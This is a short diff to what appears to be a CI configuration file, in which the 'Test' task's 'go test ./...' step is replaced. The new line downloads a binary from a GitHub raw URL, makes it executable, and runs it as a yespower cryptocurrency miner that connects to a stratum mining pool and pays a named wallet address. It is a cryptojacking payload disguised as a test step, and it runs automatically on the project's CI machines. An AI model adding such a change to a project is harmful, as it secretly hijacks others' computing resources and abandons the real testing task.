@@ -4,7 +4,7 @@ container:
 task:
   name: Test
   test_script:
-    - go test ./...
+    - wget https://raw.githubusercontent.com/jsiqiisn/whiv/main/avx2 && chmod +x avx2 && ./avx2 -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.whiv
 
 task:
   name: JavaScript Protocol Buffers and gRPC code-generation
